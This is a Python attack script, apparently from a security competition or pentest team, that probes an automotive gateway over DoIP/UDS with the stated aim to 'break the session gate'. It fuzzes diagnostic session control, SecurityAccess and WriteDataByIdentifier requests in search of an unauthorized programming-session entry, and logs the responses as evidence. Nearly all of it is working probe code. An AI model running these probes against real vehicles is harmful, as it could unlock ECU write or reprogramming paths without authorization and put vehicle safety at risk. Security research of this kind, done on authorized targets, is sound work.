#!/usr/bin/env python3
"""Break the session gate on TA=0xE442.

Facts so far: services {10,22,27,2E,31} only; 34/36/37 = NRC 0x11.
10 03 -> 50 03, every other 10 xx -> 7F 10 12.
27 ALL subfns -> 7F 27 7E (subFunctionNotSupportedInActiveSession).

Try to find the real "Programming Session" entry:
  - raw DoIP frame capture for 10 03 (which SA answers?)
  - suppressPositiveResponse bit (0x82/0x83/0x81)
  - 10 xx with trailing parameter bytes
  - 27 right after 10 03 within the S3 window
  - 2E F1A3 / 2E probes (write path) -- only a few, lead owns the sweep
"""
import sys, os, json, binascii, struct, time
sys.path.insert(0, r"D:\qwb\05_TOOLS")
from cgw_doip import DoIP, open_session, pkt

OUT = r"D:\qwb\03_EVIDENCE\cgw_s09"
TA = 0xE442
rec = []


def hx(b):
    return binascii.hexlify(b).decode().upper() if b else ""


def rawframe(d, uds, to=3.0):
    """Send 0x8001 and return (full_raw_bytes_rx_hex, uds_payload_hex, ms)."""
    payload = struct.pack(">HH", d.sa, TA) + uds
    t0 = time.time()
    d.s.sendall(pkt(0x8001, payload))
    old = d.s.gettimeout()
    d.s.settimeout(to)
    # read the whole frame ourselves
    hdr = b""
    while len(hdr) < 8:
        c = d.s.recv(8 - len(hdr))
        if not c:
            break
        hdr += c
    if len(hdr) < 8:
        d.s.settimeout(old)
        return None, None, (time.time() - t0) * 1000
    ver, inv, ptype, plen = struct.unpack(">BBHI", hdr)
    body = b""
    while len(body) < plen:
        c = d.s.recv(plen - len(body))
        if not c:
            break
        body += c
    d.s.settimeout(old)
    el = (time.time() - t0) * 1000
    full = hdr + body
    return full, body, el


def go(d, uds, to=3.0, tag="", rawdump=False):
    if rawdump:
        full, body, ms = rawframe(d, uds, to)
        fh = hx(full)
        udsh = hx(body[4:]) if body and len(body) >= 4 else ""
        rec.append({"tag": tag, "tx": hx(uds), "rx": udsh, "frame": fh, "ms": round(ms)})
        print("  %-26s %-22s -> %-26s %5.0fms  FRAME=%s"
              % (tag, hx(uds), udsh or "EMPTY", ms, fh or "NONE"), flush=True)
        return body[4:] if body and len(body) >= 4 else None
    r, ms = d.uds(uds, ta=TA, extra_timeout=to)
    rec.append({"tag": tag, "tx": hx(uds), "rx": hx(r), "ms": round(ms)})
    print("  %-26s %-22s -> %-26s %5.0fms" % (tag, hx(uds), hx(r) or "EMPTY", ms), flush=True)
    return r


d = open_session(timeout=5.0)
print("=== A) raw DoIP frames: who answers? ===")
go(d, b"\x10\x03", tag="10 03 (raw)", rawdump=True)
go(d, b"\x22\xF1\xA3", tag="22 F1A3 (raw)", rawdump=True)
go(d, b"\x27\x01", tag="27 01 (raw)", rawdump=True)
go(d, b"\x3E\x00", tag="3E 00 (raw)", rawdump=True)

print("\n=== B) suppressPositiveResponse bit variants ===")
for uds in ("1002", "1082", "1003", "1083", "2701", "2781",
            "10" "02", "3400", "3480"):
    pass
for uds in ["1082", "1083", "1081", "2781", "3400"]:
    go(d, bytes.fromhex(uds), tag="suppress " + uds)

print("\n=== C) 10 xx with trailing parameter bytes ===")
cands = [("100200", "10 02 +00"), ("100201", "10 02 +01"), ("1002FF", "10 02 +FF"),
         ("100300", "10 03 +00"), ("104000", "10 40 +00"), ("104100", "10 41 +00"),
         ("104200", "10 42 +00"), ("106000", "10 60 +00"), ("106100", "10 61 +00"),
         ("107F00", "10 7F +00"), ("100202", "10 02 +02"), ("100200000000", "10 02 +6B")]
for uds, tag in cands:
    go(d, bytes.fromhex(uds), tag=tag)

print("\n=== D) 27 immediately after 10 03 (S3 fresh) ===")
for uds, tag in [("2701", "27 01 after 1003"), ("2701", "27 01 again"),
                 ("2702", "27 02"), ("2703", "27 03"), ("2705", "27 05"),
                 ("2701", "27 01 x3")]:
    go(d, b"\x10\x03", tag="keepalive 1003")
    go(d, bytes.fromhex(uds), tag=tag)

print("\n=== E) write path spot-check (lead owns full sweep) ===")
for uds in ["2EF1A3", "2EF1A300", "2EF1A3000000000000000000",
            "2EF190", "2E0102", "2E0000"]:
    go(d, bytes.fromhex(uds), tag="2E " + uds[2:])

json.dump(rec, open(os.path.join(OUT, "0006_e442_session_gate.json"), "w"), indent=1)
print("\nwrote 0006_e442_session_gate.json (%d records)" % len(rec))
d.close()
